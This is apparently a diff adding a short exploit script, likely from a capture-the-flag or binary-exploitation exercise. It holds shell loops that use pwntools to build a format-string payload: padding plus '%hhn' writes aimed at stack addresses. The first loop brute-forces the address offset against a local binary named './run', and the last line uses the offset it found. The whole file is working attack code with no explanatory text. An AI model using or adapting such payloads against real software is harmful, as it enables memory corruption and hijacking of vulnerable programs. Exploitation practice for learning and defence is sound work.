@@ -1,0 +1,3 @@
+for x in {0..256} ; do echo $x; python -c "import sys; from pwn import *;sys.stdout.write( 'AAAA'*17 + 'AAAAAA' + '%1\$170c' + '%18\$hhn' + p64(0x7fffffffe300 + $x))" | ./run ; done
+
+python -c "import sys; from pwn import *;sys.stdout.write( 'AAAA'*17 + 'AAAAAA' + '%1\$170c' + '%18\$hhn' + p64(0x7fffffffe300 + 236))" | ./run
